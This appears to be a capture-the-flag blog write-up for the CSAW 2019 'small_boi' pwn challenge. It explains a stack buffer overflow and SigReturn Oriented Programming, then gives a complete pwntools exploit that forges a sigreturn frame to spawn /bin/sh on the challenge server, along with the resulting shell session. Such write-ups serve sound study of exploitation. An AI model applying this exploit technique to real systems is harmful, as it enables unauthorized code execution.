---
layout: post
title:  "CSAW Qualifiers 2019: small_boi"
date:   2019-09-16 04:00:00 +0800
categories: pwn
tags: CSAW-Qualifiers-2019
---

Very tiny binary. I used SigReturn Oriented Programming (SROP) to exploit it.

### Challenge

* **Category:** pwn
* **Points:** 100
* **Solves:** ~150

>you were a baby boi earlier, can you be a small boi now?
>
>nc pwn.chal.csaw.io 1002

### Solution

We get given a very tiny binary with only three functions. We have `start` which calls `sub_40018C`:
```c
public start
start proc near
; __unwind {
push    rbp
mov     rbp, rsp
mov     eax, 0
call    sub_40018C
xor     rax, rdi
mov     rax, 3Ch ; '<'
syscall                 ; LINUX - sys_exit
nop
pop     rbp
retn
; } // starts at 4001AD
start endp
```

We have `sub_40018C` which simply does a `read` syscall and reads 0x200 bytes of input into a stack buffer (giving us a buffer overflow):
```c
sub_40018C proc near

buf= byte ptr -20h

; __unwind {
push    rbp
mov     rbp, rsp
lea     rax, [rbp+buf]
mov     rsi, rax        ; buf
xor     rax, rax
xor     rdi, rdi        ; fd
mov     rdx, 200h       ; count
syscall                 ; LINUX - sys_read
mov     eax, 0
pop     rbp
retn
; } // starts at 40018C
sub_40018C endp
```

And finally we have `sub_40017C` which has a `rt_sigreturn` syscall, hinting at the fact that we will need to do SigReturn Oriented Programming (SROP):
```c
sub_40017C proc near
; __unwind {
push    rbp
mov     rbp, rsp
mov     eax, 0Fh
syscall                 ; LINUX - sys_rt_sigreturn
nop
pop     rbp
retn
; } // starts at 40017C
sub_40017C endp
```

The way the `rt_sigreturn` syscall works is by context-switching into a completely new stack frame which is decided by a `sigcontext` structure. In the case of SROP, we forge a `sigcontext` structure on the stack and make the `rt_sigreturn` syscall use this forged structure to perform any syscall we want.

At the end of the day we want to perform an `execve` syscall with `/bin/sh` as its argument. The binary also conveniently has the string `'/bin/sh'` at address `0x4001ca`. With pwntools, this exploit is very easy.

Using gdb, first find the offset for the buffer overflow (in this case, 40 characters). Then you want to jump to the `rt_sigreturn` syscall, which is essentially just `mov rax, 0xf` followed by `syscall`. Then you put a fake `sigcontext` structure onto the stack (pwntools calls this a `SigreturnFrame`), where you set `rax` to 59 (for `execve`), `rdi` to the address of the `/bin/sh` string, `rsi` and `rdx` both to 0, and `rip` to the `syscall` instruction.

the `rt_sigreturn` syscall will context switch using these values from the fake `sigcontext` structure, thus calling `execve` with `/bin/sh` and giving us a shell.
```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

p = remote('pwn.chal.csaw.io', 1002)

bin_sh = 0x4001ca
sigreturn = 0x400180
syscall = 0x400185

payload = 'A'*40
payload += p64(sigreturn)

frame = SigreturnFrame(kernel='amd64')
frame.rax = 59
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload += str(frame)

p.send(payload)

p.interactive()
```

```sh
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/csaw-2019-quals/pwn/small_boi$ ./exploit.py
[+] Opening connection to pwn.chal.csaw.io on port 1002: Done
[*] Switching to interactive mode
$
$ ls
flag.txt  small_boi
$ cat flag.txt
flag{sigrop_pop_pop_pop}
$  
```

Flag: `flag{sigrop_pop_pop_pop}`
